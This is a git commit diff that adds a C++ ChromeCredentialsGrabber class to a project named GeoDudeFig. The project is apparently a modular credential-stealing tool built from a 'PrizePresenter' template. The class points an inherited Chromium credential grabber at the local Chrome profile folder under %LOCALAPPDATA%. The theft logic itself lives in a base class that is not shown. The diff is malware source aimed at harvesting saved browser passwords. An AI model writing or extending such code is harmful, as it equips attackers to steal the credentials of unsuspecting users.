e669edfeb244bff7e546f255059e6e2811d12251
Gil Alpert <87145166+gilgoolon@users.noreply.github.com>
2025-06-16 14:41:32 +0300

    GeoDudeFig: create fig from PrizePresenter template

---
+++ GeoDudeFig/GeoDudeFig/Grabbers/ChromeCredentialsGrabber.cpp
@@ -0,0 +1,18 @@
+﻿#include "ChromeCredentialsGrabber.hpp"
+
+#include "Utils/Environment.hpp"
+
+ChromeCredentialsGrabber::ChromeCredentialsGrabber():
+	ChromiumCredentialsGrabber(get_local_chrome_path())
+{
+}
+
+std::filesystem::path ChromeCredentialsGrabber::get_local_chrome_path()
+{
+	return Environment::expand_variables(CHROME_ROOT_FOLDER);
+}
+
+std::wstring ChromeCredentialsGrabber::source() const
+{
+	return L"Chrome";
+}
---
+++ GeoDudeFig/GeoDudeFig/Grabbers/ChromeCredentialsGrabber.hpp
@@ -0,0 +1,21 @@
+﻿#pragma once
+#include "ChromiumCredentialsGrabber.hpp"
+
+class ChromeCredentialsGrabber final : public ChromiumCredentialsGrabber
+{
+public:
+	explicit ChromeCredentialsGrabber();
+	~ChromeCredentialsGrabber() override = default;
+	ChromeCredentialsGrabber(const ChromeCredentialsGrabber&) = delete;
+	ChromeCredentialsGrabber& operator=(const ChromeCredentialsGrabber&) = delete;
+	ChromeCredentialsGrabber(ChromeCredentialsGrabber&&) = delete;
+	ChromeCredentialsGrabber& operator=(ChromeCredentialsGrabber&&) = delete;
+
+private:
+	static constexpr auto CHROME_ROOT_FOLDER = L"%LOCALAPPDATA%/Google/Chrome/";
+
+	[[nodiscard]] static std::filesystem::path get_local_chrome_path();
+
+public:
+	[[nodiscard]] std::wstring source() const override;
+};
